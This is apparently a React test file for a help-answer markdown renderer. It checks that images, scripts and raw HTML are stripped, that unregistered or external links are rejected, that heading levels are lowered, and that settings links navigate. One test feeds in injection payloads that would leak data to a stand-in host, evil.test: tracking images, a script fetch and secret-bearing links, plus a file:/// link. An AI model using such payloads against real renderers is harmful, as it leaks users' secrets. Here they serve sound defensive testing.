// @vitest-environment jsdom
import type { ComponentProps } from "react";
import { act, createElement } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, expect, it, vi } from "vite-plus/test";
import { HelpMarkdown } from "./HelpMarkdown";
import { HELP_ISSUE_TRACKER_URL } from "./helpLinks";

const state = vi.hoisted(() => ({
  navigate: vi.fn(),
  openExternal: vi.fn(async (_url: string) => undefined),
}));
vi.mock("@tanstack/react-router", () => ({
  Link: ({
    to,
    hash,
    children,
    ...props
  }: Omit<ComponentProps<"a">, "href"> & { to: string; hash?: string }) =>
    createElement(
      "a",
      {
        ...props,
        href: hash ? `${to}#${hash}` : to,
        onClick: (event: MouseEvent) => {
          event.preventDefault();
          state.navigate(to, hash);
        },
      },
      children,
    ),
}));
vi.mock("../../localApi", () => ({
  ensureLocalApi: () => ({ shell: { openExternal: state.openExternal } }),
}));
vi.mock("@t3tools/shared/HostProcess", () => {
  throw new Error("Help rendering must not initialize host process services.");
});

let root: Root;
let container: HTMLDivElement;
beforeEach(() => {
  vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
  state.navigate.mockClear();
  state.openExternal.mockClear();
  container = document.createElement("div");
  document.body.appendChild(container);
  root = createRoot(container);
});
afterEach(async () => {
  await act(() => root.unmount());
  container.remove();
  vi.unstubAllGlobals();
});

it("renders readable answers without loading model images or enabling unexpected links or HTML", async () => {
  await act(() =>
    root.render(
      <HelpMarkdown
        content={[
          "Check **Providers** first.",
          "![tracking](https://evil.test/collect?secret=value)",
          '<img src="https://evil.test/html-image"><script>fetch("https://evil.test")</script>',
          "[unexpected](https://evil.test/collect?secret=value)",
          "[payload](/settings/providers?secret=value)",
          "[file](file:///Users/private)",
          "[Providers](/settings/providers)",
          `[Issue tracker](${HELP_ISSUE_TRACKER_URL})`,
        ].join("\n\n")}
      />,
    ),
  );
  expect(container.textContent).toContain("Check Providers first.");
  expect(container.querySelector("img, script, iframe, video, audio")).toBeNull();
  expect([...container.querySelectorAll("a")].map((node) => node.getAttribute("href"))).toEqual([
    "/settings/providers",
    HELP_ISSUE_TRACKER_URL,
  ]);
  expect(state.openExternal).not.toHaveBeenCalled();
  expect(state.navigate).not.toHaveBeenCalled();
  await act(() =>
    container.querySelector<HTMLAnchorElement>('a[href="/settings/providers"]')!.click(),
  );
  expect(state.navigate).toHaveBeenCalledExactlyOnceWith("/settings/providers", "");
  await act(async () =>
    container.querySelector<HTMLAnchorElement>(`a[href="${HELP_ISSUE_TRACKER_URL}"]`)!.click(),
  );
  expect(state.openExternal).toHaveBeenCalledExactlyOnceWith(HELP_ISSUE_TRACKER_URL);
});

it("navigates to registered settings anchors while keeping rejected destinations readable", async () => {
  await act(() =>
    root.render(
      <HelpMarkdown
        content={[
          "[Computer use](/settings/general#computer-use)",
          "[Keep worktrees](/settings/storage#storage-worktrees)",
          "[Wrong route](/settings/providers#computer-use)",
          "[Displaced ID](/settings/storage#storage-worktree-keep-when)",
          "[Unknown route](/settings/not-registered)",
          "[Empty anchor](/settings/providers#)",
        ].join("\n\n")}
      />,
    ),
  );
  expect([...container.querySelectorAll("a")].map((node) => node.getAttribute("href"))).toEqual([
    "/settings/general#computer-use",
    "/settings/storage#storage-worktrees",
  ]);
  for (const label of ["Wrong route", "Displaced ID", "Unknown route", "Empty anchor"]) {
    expect(container.textContent).toContain(label);
  }
  expect(state.navigate).not.toHaveBeenCalled();
  expect(state.openExternal).not.toHaveBeenCalled();
  await act(() =>
    container.querySelector<HTMLAnchorElement>('a[href="/settings/general#computer-use"]')!.click(),
  );
  expect(state.navigate).toHaveBeenCalledExactlyOnceWith("/settings/general", "computer-use");
});

it("keeps answer headings below the conversation's own headings for screen readers", async () => {
  await act(() =>
    root.render(
      <HelpMarkdown content={["# Steps", "## Details", "###### Fine print"].join("\n\n")} />,
    ),
  );
  expect(
    [...container.querySelectorAll("h1, h2, h3, h4, h5, h6")].map((node) => [
      node.textContent,
      node.getAttribute("aria-level"),
    ]),
  ).toEqual([
    ["Steps", "4"],
    ["Details", "5"],
    ["Fine print", "6"],
  ]);
});

it.each(["plugins", "skills", "scheduled-tasks"])(
  "opens the %s settings page even without searchable setting rows",
  async (section) => {
    const to = `/settings/${section}`;
    await act(() => root.render(<HelpMarkdown content={`[Open settings](${to})`} />));
    const link = container.querySelector<HTMLAnchorElement>(`a[href="${to}"]`);
    expect(link).not.toBeNull();
    await act(() => link!.click());
    expect(state.navigate).toHaveBeenCalledExactlyOnceWith(to, "");
  },
);
